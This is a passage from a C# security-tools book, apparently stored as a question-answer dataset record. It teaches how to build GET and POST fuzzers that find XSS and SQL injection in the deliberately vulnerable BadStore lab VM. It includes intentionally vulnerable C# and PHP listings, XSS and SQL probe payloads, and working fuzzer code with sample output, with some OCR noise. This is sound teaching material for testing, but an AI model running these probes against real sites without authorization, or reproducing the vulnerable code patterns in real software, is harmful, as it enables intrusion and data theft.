MessageBox() function, which\nexpects a few parameters such as the title of the pop-up and the text to be\ndisplayed. For Linux, the printf() function expects a string to print. Both of\nthese functions are looked up at runtime, which means we can compile this\non any system because the function in the external library isn’t looked for\nuntil the program is running and the function is called. This lets us com-\npile the application on any operating system, regardless of whether that sys-\ntem has either or both libraries.\nWith our native functions declared, we can write a quick Main()\nmethod v that checks the current operating system with an if statement\nusing os.Platform w. The Platform property we use maps to the PlatformID\nenumeration x, which stores the available operating systems that the pro-\ngram could be running on. Using the PlatformID enumeration, we can test\nwhether we are on Windows and then call the respective method: either\nMessageBox() y on Windows or printf() z on Unix. This application, when\ncompiled, can be run on either a Windows machine or a Linux machine,\nno matter what operating system compiled it.\nConclusion\nThe C# language has many modern features that make it a great language\nfor complex data and applications. We have only scratched the surface of\nsome of the more powerful features like anonymous methods and P/Invoke.\nYou’ll become intimate with the concepts of classes and interfaces, as well as\nC# Crash Course 13\nmany other advanced features, in the chapters to come. In addition, you’ll\nlearn about many more of the core classes available to you, such as HTTP\nand TCP clients and much more.\nAs we develop our own custom security tools throughout this book,\nyou will also learn about general programming patterns, which are useful\nconventions for creating classes that make building on them easy and fast.\nGood examples of programming patterns are used in Chapters 5 and 11\nwhere we interface with APIs and RPCs of third-party tools such as Nessus\nand Metasploit.\nBy the end of this book, we will have covered how C# can be used for\nevery security practitioner’s job—from the security analyst to the engineer,\nand even the hobbyist researcher at home. C# is a beautiful and power-\nful language, and with cross-platform support from Mono bringing C# to\nphones and embedded devices, it is just as capable and usable as Java and\nother alternatives.\n14 Chapter 1",
    "question": "What are the key features of C# that make it suitable for cross-platform development and what are some examples of how it can be used to create classes and interfaces for representing data structures?",
    "summary": "C# is a versatile language that runs on all modern Windows systems and can be used on Linux with Mono, making it suitable for cross-platform development. It offers a powerful standard library and supports object-oriented programming, allowing for the creation of complex data structures and classes. The text also covers basic C# syntax, abstract classes, interfaces, and how to use delegates and P/Invoke to interact with native libraries."
  },
  {
    "start": 20,
    "end": 37,
    "text": "2\nfu z zinG anD e xPloitinG\nxSS anD SQl injeCtion\nIn this chapter, you’ll learn how to write a\nshort and sweet cross-site scripting (XSS)\nand SQL injection fuzzer for URLs that take\nHTTP parameters in GET and POST requests.\nA fuzzer is software that attempts to find errors in other\nsoftware, such as that on servers, by sending bad or\nmalformed data. The two general types of fuzzers are mutational and gen-\nerational. A mutational fuzzer attempts to taint the data in a known-good\ninput with bad data, without regard for the protocol or the structure of the\ndata. In contrast, a generational fuzzer takes into account the nuances of the\nserver’s communication protocol and uses these nuances to generate tech-\nnically valid data that is sent to the server. With both types of fuzzers, the\ngoal is to get the server to return an error to the fuzzer.\nWe’ll write a mutational fuzzer that you can use when you have a known-\ngood input in the form of a URL or HTTP request. (We’ll write a genera-\ntional fuzzer in Chapter 3.) Once you’re able to use a fuzzer to find XSS and\nSQL injection vulnerabilities, you’ll learn how to exploit the SQL injection\nvulnerabilities to retrieve usernames and password hashes from the database.\nIn order to find and exploit XSS and SQL injection vulnerabilities, we’ll\nuse the core HTTP libraries to build HTTP requests programmatically in\nC#. We’ll first write a simple fuzzer that parses a URL and begins fuzzing\nthe HTTP parameters using GET and POST requests. Next, we’ll develop\nfull exploits for the SQL injection vulnerabilities that use carefully crafted\nHTTP requests to extract user information from the database.\nWe’ll test our tools in this chapter against a small Linux distribution\ncalled BadStore (available at the VulnHub website, https://www.vulnhub\n.com/). BadStore is designed with vulnerabilities like SQL injections and\nXSS attacks (among many others). After downloading the BadStore ISO\nfrom VulnHub, we’ll use the free VirtualBox virtualization software to\ncreate a virtual machine in which to boot the BadStore ISO so that we can\nattack without risk of compromising our own host system.\nSetting up the Virtual Machine\nTo install VirtualBox on Linux, Windows, or OS X, download the VirtualBox\nsoftware from https://www.virtualbox.org/. (Installation should be simple;\njust follow the latest directions on the site when you download the software.)\nVirtual machines (VMs) allow us to emulate a computer system using a physi-\ncal computer. We can use virtual machines to easily create and manage vul-\nnerable software systems (such as the ones we will use throughout the book).\nAdding a Host-Only Virtual Network\nYou may need to create a host-only virtual network for the VM before actu-\nally setting it up. A host-only network allows communication only between\nVMs and the host system. Here are the steps to follow:\n1. Click File4Preferences to open the VirtualBox – Preferences dialog.\nOn OS X, select the VirtualBox4Preferences.\n2. Click the Network section on the left. You should see two tabs: NAT\nNetworks and Host-only Networks. On OS X, click the Network tab at\nthe top of the Settings dialog.\n3. Click the Host-only Networks tab and then the Add host-only network\n(Ins) button on the right. This button is an icon of a network card over-\nlaid with a plus sign. This should create a network named vboxnet0.\n4. Click the Edit host-only network (Space) button on the right. This but-\nton is an icon of a screwdriver.\n5. From the dialog that opens, click the DHCP Server tab. Check the\nEnable Server box. In the Server Address field, enter the IP address\n192.168.56.2. In the Server Mask field, enter 255.255.255.0. In the Lower\nAddress Bound field, enter 192.168.56.100. In the Upper Address Bound\nfield, enter 192.168.56.199.\n6. Click OK to save changes to the host-only network.\n7. Click OK again to close the Settings dialog.\n16 Chapter 2\nCreating the Virtual Machine\nOnce VirtualBox is installed and configured with a host-only network,\nhere’s how to set up the VM:\n1. Click the New icon in the top-left corner, as shown in Figure 2-1.\n2. When presented with a dialog to choose the name of the operating sys-\ntem and type, select the Other Linux (32-bit) drop-down option.\n3. Click Continue, and you should be presented with a screen to give the\nvirtual machine some RAM. Set the amount of RAM to 512 MB and\nclick Continue. (Fuzzing and exploiting can make the web server use a\nlot of RAM on the virtual machine.)\n4. When asked to create a new virtual hard drive, choose Do not add a\nvirtual hard drive and click Create. (We’ll run BadStore from the ISO\nimage.) You should now see the VM in the left pane of the VirtualBox\nManager window, as shown in Figure 2-1.\nFigure 2-1: VirtualBox with a BadStore VM\nBooting the Virtual Machine from the BadStore ISO\nOnce the VM has been created, set it to boot from the BadStore ISO by fol-\nlowing these steps:\n1. Right-click the VM in the left pane of the VirtualBox Manager and\nclick Settings. A dialog should appear showing the current settings for\nthe network card, CD-ROM, and other miscellaneous configuration\nitems.\nFuzzing and Exploiting XSS and SQL Injection 17\n2. Select the Network tab in the Settings dialog. You should see upwards\nof seven settings for the network card, including NAT (network address\ntranslation), host-only, and bridged. Choose host-only networking to\nallocate an IP address that is accessible only from the host machine but\nnot from the rest of the Internet.\n3. You need to set the type of network card in the Advanced drop-down to\nan older chipset, because BadStore is based on an old Linux kernel and\nsome newer chipsets aren’t supported. Choose PCnet-FAST III.\nNow set the CD-ROM to boot from the ISO on the hard drive by follow-\ning these steps:\n1. Select the Storage tab in the Settings dialog. Click the CD icon to show\na menu with the option Choose a virtual CD/DVD disk file.\n2. Click the Choose a virtual CD/DVD disk file option to find the\nBadStore ISO that you saved to your filesystem and set it as the\nbootable media. The virtual machine should now be ready to boot.\n3. Save the settings by clicking OK in the bottom-right corner of the\nSettings tab. Then click the Start button in the top-left corner of the\nVirtualBox Manager, next to the Settings gear button, to boot the vir-\ntual machine.\n4. Once the machine has booted, you should see a message saying, “Please\npress Enter to activate this console.” Press enter and type ifconfig to\nview the IP configuration that should have been acquired.\n5. Once you have your virtual machine’s IP address, enter it in your web\nbrowser, and you should see a screen like the one shown in Figure 2-2.\nFigure 2-2: The main page of the BadStore web application\n18 Chapter 2\nSQL injections\nIn today’s rich web applications, programmers need to be able to store\nand query information behind the scenes in order to provide high-quality,\nrobust user experiences. This is generally accomplished using a Structured\nQuery Language (SQL; pronounced sequel) database such as MySQL,\nPostgreSQL, or Microsoft SQL Server.\nSQL allows a programmer to interact with a database programmatically\nusing SQL statements—code that tells the database how to create, read,\nupdate, or delete data based on some supplied information or criteria. For\ninstance, a SELECT statement asking the database for the number of users in\na hosted database might look like Listing 2-1.\nSELECT COUNT(*) FROM USERS\nListing 2-1: Sample SQL SELECT statement\nSometimes programmers need SQL statements to be dynamic (that is,\nto change based on a user’s interaction with a web application). For example,\na programmer may need to select information from a database based on a\ncertain user’s ID or username.\nHowever, when a programmer builds a SQL statement using data or\nvalues supplied by a user from an untrusted client such as a web browser,\na SQL injection vulnerability may be introduced if the values used to build\nand execute SQL statements are not properly sanitized. For example, the\nC# SOAP method shown in Listing 2-2 might be used to insert a user into a\ndatabase hosted on a web server. (SOAP, or Simple Object Access Protocol, is a\nweb technology powered by XML that’s used to create APIs on web appli-\ncations quickly. It’s popular in enterprise languages such as C# and Java.)\n[WebMethod]\npublic string AddUser(string username, string password)\n{\nNpgsqlConnection conn = new NpgsqlConnection(_connstr);\nconn.Open();\nstring sql = \"insert into users values('{0}', '{1}');\";\nusql = String.Format(sql, username, password);\nNpgsqlCommand command = new NpgsqlCommand(sql, conn);\nvcommand.ExecuteNonQuery();\nconn.Close();\nreturn \"Excellent!\";\n}\nListing 2-2: A C# SOAP method vulnerable to a SQL injection\nIn this case, the programmer hasn’t sanitized the username and pass-\nword before creating u and executing v a SQL string. As a result, an\nattacker could craft a username or password string to make the database\nrun carefully crafted SQL code designed to give them remote command\nexecution and full control of the database.\nFuzzing and Exploiting XSS and SQL Injection 19\nIf you were to pass in an apostrophe with one of the parameters (say\nuser'name instead of username), the ExecuteNonQuery() method would try to\nrun an invalid SQL query (shown in Listing 2-3). Then the method would\nthrow an exception, which would be shown in the HTTP response for the\nattacker to see.\ninsert into users values('user'name', 'password');\nListing 2-3: This SQL query is invalid due to unsanitized user-supplied data.\nMany software libraries that enable database access allow a program-\nmer to safely use values supplied by an untrusted client like a web browser\nwith parameterized queries. These libraries automatically sanitize any untrusted\nvalues passed to a SQL query by escaping characters such as apostrophes,\nparentheses, and other special characters used in the SQL syntax. Param-\neterized queries and other types of Object Relational Mapping (ORM)\nlibraries like NHibernate help to prevent these SQL injection issues.\nUser-supplied values like these tend to be used in WHERE clauses within\nSQL queries, as in Listing 2-4.\nSELECT * FROM users WHERE user_id = '1'\nListing 2-4: Sample SQL SELECT statement selecting a row for a specific user_id\nAs shown in Listing 2-3, throwing a single apostrophe into an HTTP\nparameter that is not properly sanitized before being used to build a dynamic\nSQL query could cause an error to be thrown by the web application (such\nas an HTTP return code of 500) because an apostrophe in SQL denotes the\nbeginning or end of a string. The single apostrophe invalidates the state-\nment by ending a string prematurely or by beginning a string without end-\ning it. By parsing the HTTP response to such a request, we can fuzz these\nweb applications and search for user-supplied HTTP parameters that lead\nto SQL errors in the response when the parameters are tampered with.\nCross-Site Scripting\nLike SQL injection, cross-site scripting (XSS) attacks exploit vulnerabilities\nin code that crop up when programmers build HTML to be rendered in\nthe web browser using data passed from the web browser to the server.\nSometimes, the data supplied by an untrusted client, such as a web\nbrowser, to the server can contain HTML code such as JavaScript, allow-\ning an attacker to potentially take over a website by stealing cookies or\nredirecting users to a malicious website with raw, unsanitized HTML.\nFor example, a blog that allows for comments might send an HTTP\nrequest with the data in a comment form to a site’s server. If an attacker\nwere to create a malicious comment with embedded HTML or JavaScript,\nand the blog software trusted and therefore did not sanitize the data from\nthe web browser submitting the “comment,” the attacker could use their\n20 Chapter 2\nloaded attack comment to deface the website with their own HTML code or\nredirect any of the blog’s visitors to the attacker’s own website. The attacker\ncould then potentially install malware on the visitors’ machines.\nGenerally speaking, a quick way to detect code in a website that may\nbe vulnerable to XSS attacks is to make a request to the site with a tainted\nparameter. If the tainted data appears in the response without alteration,\nyou may have found a vector for XSS. For instance, suppose you pass <xss>\nin a parameter within an HTTP request, as in Listing 2-5.\nGET /index.php?name=Brandon<xss> HTTP/1.1\nHost: 10.37.129.5\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nListing 2-5: Sample GET request to a PHP script with a query string parameter\nThe server responds with something like the HTTP response in\nListing 2-6.\nHTTP/1.1 200 OK\nDate: Sun, 19 Apr 2015 21:28:02 GMT\nServer: Apache/2.4.7 (Ubuntu)\nX-Powered-By: PHP/5.5.9-1ubuntu4.7\nContent-Length: 32\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html\nWelcome Brandon&lt;xss&gt;<br />\nListing 2-6: Sample response from the PHP script sanitizing the name query string parameter\nEssentially, if the code <xss> is replaced with a version that has some\nHTML entities, you know that the site is filtering input using a PHP func-\ntion such as htmlspecialchars() or a similar method. However, if the site\nsimply returns <xss> in the response, you know that it’s not performing\nany filtering or sanitization, as with the HTTP name parameter in the code\nshown in Listing 2-7.\n<?php\n$name = $_GET['name'];\nuecho \"Welcome $name<br>\";\n?>\nListing 2-7: PHP code vulnerable to XSS\nAs with the code vulnerable to a SQL injection in Listing 2-1, the pro-\ngrammer is not sanitizing or replacing any potentially bad characters in\nthe parameter before rendering the HTML to the screen u. By passing\nFuzzing and Exploiting XSS and SQL Injection 21\na specially crafted name parameter to the web application, we can render\nHTML to the screen, execute JavaScript, and even run Java applets that\nattempt to take over the computer. For example, we could send a specially\ncrafted URL such as the one in Listing 2-8.\nwww.example.com/vuln.php?name=Brandon<script>alert(1)</script>\nListing 2-8: A URL with a query string parameter that would pop up a JavaScript alert if\nthe parameter were vulnerable to XSS\nThe URL in Listing 2-8 could cause a JavaScript pop-up to appear in\nthe browser with the number 1 if the PHP script were using the name param-\neter to build some HTML code that would eventually be rendered in the\nweb browser.\nFuzzing Get requests with a Mutational Fuzzer\nNow that you know the basics of SQL injection and XSS vulnerabilities,\nlet’s implement a quick fuzzer to find potential SQL injection or XSS vul-\nnerabilities in query string parameters. Query string parameters are the\nparameters in a URL after the ? sign, in key = value format. We’ll focus\non the HTTP parameters in a GET request, but first we’ll break up a URL\nso we can loop through any HTTP query string parameters, as shown in\nListing 2-9.\npublic static void Main(string[] args)\n{\nustring url = args[0];\nint index = url.vIndexOf(\"?\");\nstring[] parms = url.wRemove(0, index+1).xSplit('&');\nforeach (string parm in parms)\nConsole.WriteLine(parm);\n}\nListing 2-9: Small Main() method breaking apart the query string parameters in a given URL\nIn Listing 2-9, we take the first argument (args[0]) passed to the main\nfuzzing application and assume it is a URL u with some fuzzable HTTP\nparameters in the query string. In order to turn the parameters into some-\nthing we can iterate over, we remove any characters up to and including\nthe question mark (?) in the URL and use IndexOf(\"?\") v to determine the\nindex of the first occurrence of a question mark, which denotes that the\nURL has ended and that the query string parameters follow; these are the\nparameters that we can parse.\nCalling Remove(0, index+1) w returns a string that contains only our\nURL parameters. This string is then split by the '&' character x, which\nmarks the beginning of a new parameter. Finally, we use the foreach key-\nword, loop over all the strings in the parms array, and print each parameter\n22 Chapter 2\nand its value. We’ve now isolated the query string parameters and their\nvalues from the URL so that we can begin to alter the values while making\nHTTP requests in order to induce errors from the web application.\nTainting the Parameters and Testing for Vulnerabilities\nNow that we have separated any URL parameters that might be vulnerable,\nthe next step is to taint each with a piece of data that the server will sanitize\nproperly if it is not vulnerable to either XSS or SQL injection. In the case\nof XSS, our tainted data will have <xss> added, and the data to test for SQL\ninjection will have a single apostrophe.\nWe can create two new URLs to test the target by replacing the known-\ngood parameter values in the URLs with the tainted data for XSS and SQL\ninjection vulnerabilities, as shown in Listing 2-10.\nforeach (string parm in parms)\n{\nustring xssUrl = url.Replace(parm, parm + \"fd<xss>sa\");\nvstring sqlUrl = url.Replace(parm, parm + \"fd'sa\");\nConsole.WriteLine(xssUrl);\nConsole.WriteLine(sqlUrl);\n}\nListing 2-10: Modified foreach loop replacing parameters with tainted data\nIn order to test for vulnerabilities, we need to ensure that we’re creating\nURLs that our target site will understand. To do so, we first replace the old\nparameter in the URL with a tainted one, and then we print the new URLs\nwe’ll be requesting. When printed to the screen, each parameter in the\nURL should have one line that includes the XSS-tainted parameter u and\none line containing the parameter with a single apostrophe v, as shown in\nListing 2-11.\nhttp://192.168.1.75/cgi-bin/badstore.cgi?searchquery=testfd<xss>sa&action=search\nhttp://192.168.1.75/cgi-bin/badstore.cgi?searchquery=testfd'sa&action=search\n--snip--\nListing 2-11: URLs printed with tainted HTTP parameters\nBuilding the HTTP Requests\nNext, we programmatically build the HTTP requests using the HttpWebRequest\nclass, and then we make the HTTP requests with the tainted HTTP param-\neters to see if any errors are returned (see Listing 2-12).\nforeach (string parm in parms)\n{\nstring xssUrl = url.Replace(parm, parm + \"fd<xss>sa\");\nstring sqlUrl = url.Replace(parm, parm + \"fd'sa\");\nFuzzing and Exploiting XSS and SQL Injection 23\nHttpWebRequest request = (HttpWebRequest)WebRequest.uCreate(sqlUrl);\nrequest.vMethod = \"GET\";\nstring sqlresp = string.Empty;\nusing (StreamReader rdr = new\nStreamReader(request.GetResponse().GetResponseStream()))\nsqlresp = rdr.wReadToEnd();\nrequest = (HttpWebRequest)WebRequest.Create(xssUrl);\nrequest.Method = \"GET\";\nstring xssresp = string.Empty;\nusing (StreamReader rdr = new\nStreamReader(request.GetResponse().GetResponseStream()))\nxssresp = rdr.ReadToEnd();\nif (xssresp.Contains(\"<xss>\"))\nConsole.WriteLine(\"Possible XSS point found in parameter: \" + parm);\nif (sqlresp.Contains(\"error in your SQL syntax\"))\nConsole.WriteLine(\"SQL injection point found in parameter: \" + parm);\n}\nListing 2-12: Full foreach loop testing the given URL for XSS and SQL injection\nIn Listing 2-12, we use the static Create() method u from the WebRequest\nclass in order to make an HTTP request, passing the URL in the sqlUrl\nvariable tainted with a single apostrophe as an argument, and we cast\nthe resulting instantiated WebRequest returned to an HttpWebRequest. (Static\nmethods are available without instantiating the parent class.) The static\nCreate() method uses a factory pattern to create new objects based on\nthe URL passed, which is why we need to cast the object returned to an\nHttpWebRequest object. If we passed a URL prefaced with ftp:// or file://, for\ninstance, then the type of object returned by the Create() method would\nbe a different class (FtpWebRequest or FileWebRequest, respectively). We then\nset the Method property of the HttpWebRequest to GET (so we make a GET\nrequest) v and save the response to the request in the resp string using\nthe StreamReader class and the ReadToEnd() method w. If the response either\ncontains the unsanitized XSS payload or throws an error regarding SQL\nsyntax, we know we may have found a vulnerability.\nnote Notice that we’re using the using keyword in a new way here. Prior to this, we used\nusing to import classes within a namespace (such as System.Net) into the fuzzer.\nEssentially, instantiated objects (objects created with the new keyword) can be used in\nthe context of a using block in this way when the class implements the IDisposable\ninterface (which requires a class to implement a Dispose() method). When the scope of\nthe using block ends, the Dispose() method on the object is called automatically. This\nis a very useful way to manage the scope of a resource that can lead to resource leaks,\nsuch as network resources or file descriptors.\n24 Chapter 2\nTesting the Fuzzing Code\nLet’s test our code with the search field on the BadStore front page. After\nopening the BadStore application in your web browser, click the Home\nmenu item on the left side of the page and then perform a quick search\nfrom the search box in the upper-left corner. You should see a URL in your\nbrowser similar to the one shown in Listing 2-13.\nhttp://192.168.1.75/cgi-bin/badstore.cgi?searchquery=test&action=search\nListing 2-13: Sample URL to the BadStore search page\nPass the URL in Listing 2-13 (replacing the IP address with the IP\naddress of the BadStore instance on your network) to the program as an\nargument on the command line, as shown in Listing 2-14, and the fuzzing\nshould begin.\n$ ./fuzzer.exe \"http://192.168.1.75/cgi-bin/badstore.cgi?searchquery=test&action=search\"\nSQL injection point found in parameter: searchquery=test\nPossible XSS point found in parameter: searchquery=test\n$\nListing 2-14: Running the XSS and SQL injection fuzzer\nRunning our fuzzer should find both a SQL injection and XSS vulner-\nability in BadStore, with output similar to that of Listing 2-14.\nFuzzing POSt requests\nIn this section, we’ll use BadStore to fuzz the parameters of a POST request\n(a request used to submit data to a web resource for processing) saved to\nthe local hard drive. We’ll capture a POST request using Burp Suite—an\neasy-to-use HTTP proxy built for security researchers and pen testers that\nsits between your browser and the HTTP server so that you can see the data\nsent back and forth.\nDownload and install Burp Suite now from http://www.portswigger.net/.\n(Burp Suite is a Java archive or JAR file that can be saved to a thumb drive\nor other portable media.) Once Burp Suite is downloaded, start it using\nJava with the commands shown in Listing 2-15.\n$ cd ~/Downloads/\n$ java -jar burpsuite*.jar\nListing 2-15: Running Burp Suite from the command line\nOnce started, the Burp Suite proxy should be listening on port 8080.\nSet Firefox traffic to use the Burp Suite proxy as follows:\n1. From within Firefox, choose Edit4Preferences. The Advanced dialog\nshould appear.\n2. Choose the Network tab, as shown in Figure 2-3.\nFuzzing and Exploiting XSS and SQL Injection 25\nFigure 2-3: The Network tab within Firefox preferences\n3. Click Settings... to open the Connection Settings dialog, as shown in\nFigure 2-4.\nFigure 2-4: The Connection Settings dialog\n26 Chapter 2\n4. Select Manual proxy configuration and enter 127.0.0.1 into the HTTP\nProxy field and 8080 into the Port field. Click OK and then close the\nConnection Settings dialog.\nNow all requests sent through Firefox should be directed through Burp\nSuite first. (To test this, go to http://google.com/; you should see the request\nin Burp Suite’s request pane, as shown in Figure 2-5.)\nFigure 2-5: Burp Suite actively capturing a request for google .com from Firefox\nClicking the Forward button within Burp Suite should forward the\nrequest (to Google in this case) and return the response to Firefox.\nWriting a POST Request Fuzzer\nWe’ll write and test our POST request fuzzer against BadStore’s “What’s\nNew” page (see Figure 2-6). Navigate to this page in Firefox and click the\nWhat’s New menu item on the left.\nFigure 2-6: The “What’s New” items page of the BadStore web application\nFuzzing and Exploiting XSS and SQL Injection 27\nA button at the bottom of the page is used to add checked items to\nyour shopping cart. With Burp Suite sitting between your browser and the\nBadStore server, select a few items using the checkboxes on the right side\nof the page and then click Submit to initiate the HTTP request to add the\nitems to your cart. Capturing the submit request within Burp Suite should\nyield a request like Listing 2-16.\nPOST /cgi-bin/badstore.cgi?action=cartadd HTTP/1.1\nHost: 192.168.1.75\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:20.0) Gecko/20100101 Firefox/20.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://192.168.1.75/cgi-bin/badstore.cgi?action=whatsnew\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 63\ncartitem=1000&cartitem=1003&Add+Items+to+Cart=Add+Items+to+Cart\nListing 2-16: HTTP POST request from Burp Suite\nThe request shown in Listing 2-16 is a typical POST request with\nURL-encoded parameters (a set of special characters, some of which are\nwhitespace such as spaces and newlines). Note that this request uses plus\nsigns (+) instead of spaces. Save this request to a text file. We’ll use it later to\nsystematically fuzz the parameters being sent in the HTTP POST request.\nnote The parameters in an HTTP POST request are included in the last line of the\nrequest, which defines the data being posted in key/value form. (Some POST requests\npost multipart forms or other exotic types of data, but the general principle remains\nthe same.)\nNotice in this request that we are adding the items with an ID of 1000\nand 1003 to the cart. Now look at the Firefox window, and you should\nnotice that these numbers correspond to the ItemNum column. We are post-\ning a parameter along with these IDs, essentially telling the application\nwhat to do with the data we’re sending (namely, add the items to the cart).\nAs you can see, the only parameters that might be susceptible to SQL injec-\ntion are the two cartitem parameters, because these are the parameters that\nthe server will interpret.\nThe Fuzzing Begins\nBefore we start fuzzing our POST request parameters, we need to set up a\nlittle bit of data, as shown in Listing 2-17.\npublic static void Main(string[] args)\n{\nstring[] requestLines = uFile.ReadAllLines(args[0]);\nvstring[] parms = requestLines[requestLines.Length - 1].Split('&');\n28 Chapter 2\nwstring host = string.Empty;\nStringBuilder requestBuilder = new xStringBuilder();\nforeach (string ln in requestLines)\n{\nif (ln.StartsWith(\"Host:\"))\nhost = ln.Split(' ')[1].yReplace(\"\\r\", string.Empty);\nrequestBuilder.Append(ln + \"\\n\");\n}\nstring request = requestBuilder.ToString() + \"\\r\\n\";\nConsole.WriteLine(request);\n}\nListing 2-17: The Main() method reading a POST request and storing the Host header\nWe read the request from the file using File.ReadAllLines() u and\npass the first argument to the fuzzing application as the argument to\nReadAllLines(). We use ReadAllLines() instead of ReadAllText() because we\nneed to split the request in order to get information out of it (namely, the\nHost header) before fuzzing. After reading the request line by line into a\nstring array and grabbing the parameters from the last line of the file v, we\ndeclare two variables. The host variable w stores the IP address of the host we\nare sending the request to. Declared below is a System.Text.StringBuilder x,\nwhich we’ll use to build the full request as a single string.\nnote We use a StringBuilder because it’s more performant than using the += operator with\na basic string type (each time you call the += operator, you create a new string object\nin memory). On a small file like this, you won’t notice a difference, but when you’re\ndealing with a lot of strings in memory, you will. Using a StringBuilder creates only\none object in memory, resulting in much less memory overhead.\nNow we loop through each line in the request that was previously read\nin. We check whether the line begins with \"Host:\" and, if so, assign the\nsecond half of the host string to the host variable. (This should be an IP\naddress.) We then call Replace() y on the string to remove the trailing \\r,\nwhich could be left by some versions of Mono, since an IP address does\nnot have \\r in it. Finally, we append the line with \\r\\n to the StringBuilder.\nHaving built the full request, we assign it to a new string variable called\nrequest. (For HTTP, your request must end with \\r\\n; otherwise, the server\nresponse will hang.)\nFuzzing Parameters\nNow that we have the full request to send, we need to loop through and\nattempt to fuzz the parameters for SQL injections. Within this loop, we’ll\nuse the classes System.Net.Sockets.Socket and System.Net.IPEndPoint. Because\nwe have the full HTTP request as a string, we can use a basic socket to com-\nmunicate with the server instead of relying on the HTTP libraries to create\nthe request for us. Now we have all that we need to fuzz the server, as shown\nin Listing 2-18.\nFuzzing and Exploiting XSS and SQL Injection 29\nIPEndPoint rhost = unew IPEndPoint(IPAddress.Parse(host), 80);\nforeach (string parm in parms)\n{\nusing (Socket sock = new vSocket(AddressFamily.InterNetwork,\nSocketType.Stream, ProtocolType.Tcp))\n{\nsock.wConnect (rhost);\nstring val = parm.xSplit('=')[1];\nstring req = request.yReplace(\"=\" + val, \"=\" + val + \"'\");\nbyte[] reqBytes = zEncoding.ASCII.GetBytes(req);\nsock.{Send(reqBytes);\nbyte[] buf = new byte[sock.ReceiveBufferSize];\nsock.|Receive(buf);\nstring response = }Encoding.ASCII.GetString(buf);\nif (response.Contains(\"error in your SQL syntax\"))\nConsole.WriteLine(\"Parameter \" + parm + \" seems vulnerable\");\nConsole.Write(\" to SQL injection with value: \" + val + \"'\");\n}\n}\nListing 2-18: Additional code added to Main() method fuzzing the POST parameters\nIn Listing 2-18, we create a new IPEndPoint object u by passing a new\nIPAddress object returned by IPAddress.Parse(host) and the port we will be\nconnecting to on the IP address (80). Now we can loop over the param-\neters grabbed from the requestLines variable previously. For each iteration,\nwe need to create a new Socket connection v to the server, and we use\nthe AddressFamily.InterNetwork to tell the socket it is IPv4 (version 4 of the\nInternet Protocol, as opposed to IPv6) and use SocketType.Stream to tell\nthe socket that this is a streaming socket (stateful, two-way, and reliable).\nWe also use ProtocolType.Tcp to tell the socket that the protocol to be used\nis TCP.\nOnce this object is instantiated, we can call Connect() w on it by pass-\ning our IPEndPoint object rhost as an argument. After we have connected\nto the remote host on port 80, we can begin fuzzing the parameter. We split\nthe parameter from the foreach loop on the equal sign (=) character x and\nextract the value of that parameter using the value in the second index of\nthe array (resulting from the method call). Then we call Replace() y on the\nrequest string to replace the original value with a tainted one. For example,\nif our value is 'foo' within the parameters string 'blah=foo&blergh=bar', we\nwould replace foo with foo' (note the apostrophe appended to the end\nof foo).\nNext, we get a byte array representing the string using Encoding.ASCII\n.GetBytes() z, and we send it over the socket { to the server port specified\nin the IPEndPoint constructor. This is equivalent to making a request from\nyour web browser to the URL in the address bar.\n30 Chapter 2\nAfter sending the request, we create a byte array equal to the size of\nthe response we will receive, and we fill it with the response from the server\nwith Receive() |. We use Encoding.ASCII.GetString() } to get the string that\nthe byte array represents, and we can then parse the response from the\nserver. We check the response from the server by checking whether the SQL\nerror message we expect is in the response data.\nOur fuzzer should output any parameters that result in SQL errors, as\nshown in Listing 2-19.\n$ mono POST_fuzzer.exe /tmp/request\nParameter cartitem=1000 seems vulnerable to SQL injection with value: 1000'\nParameter cartitem=1003 seems vulnerable to SQL injection with value: 1003'\n$\nListing 2-19: Output from running the POST fuzzer on the request\nAs we can see in the fuzzer output, the cartitem HTTP parameter seems\nvulnerable to a SQL injection. When we insert an apostrophe into the cur-\nrent value of the HTTP parameter, we get back a SQL error in the HTTP\nresponse, which makes this highly likely to be vulnerable to a SQL injection\nattacks.\nFuzzing jSOn\nAs a pentester or security engineer, you will likely run into web services that\naccept data serialized as JavaScript Object Notation ( JSON) in some form\nas input. In order to help you learn to fuzz JSON HTTP requests, I’ve writ-\nten a small web application called CsharpVulnJson that accepts JSON and\nuses the information within to persist and search user-related data. A small\nvirtual appliance has been created so that the web service works out of the\nbox; it is available on the VulnHub website (http://www.vulnhub.com/).\nSetting Up the Vulnerable Appliance\nCsharpVulnJson ships as an OVA file, a completely self-contained virtual\nmachine archive that you can simply import into your choice of virtualiza-\ntion suite. In most cases, double-clicking the OVA file should bring up your\nvirtualization software to automatically import the appliance.\nCapturing a Vulnerable JSON Request\nOnce CsharpVulnJson is running, point Firefox to port 80 on the virtual\nmachine, and you should see a user management interface like the one\nshown in Figure 2-7. We will focus on creating users with the Create User\nbutton and the HTTP request this button makes when creating a user.\nAssuming Firefox is still set up to pass through Burp Suite as an HTTP\nproxy, fill in the Create a user fields and click Create User to yield an HTTP\nrequest with the user information inside a JSON hash in Burp Suite’s request\npane, as in Listing 2-20.\nFuzzing and Exploiting XSS and SQL Injection 31\nFigure 2-7: The CsharpVulnJson web application open in Firefox\nPOST /Vulnerable.ashx HTTP/1.1\nHost: 192.168.1.56\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:26.0) Gecko/20100101 Firefox/26.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json; charset=UTF-8\nReferer: http://192.168.1.56/\nContent-Length: 190\nCookie: ASP.NET_SessionId=5D14CBC0D339F3F054674D8B\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n{\"username\":\"whatthebobby\",\"password\":\"propane1\",\"age\":42,\"line1\":\"123 Main 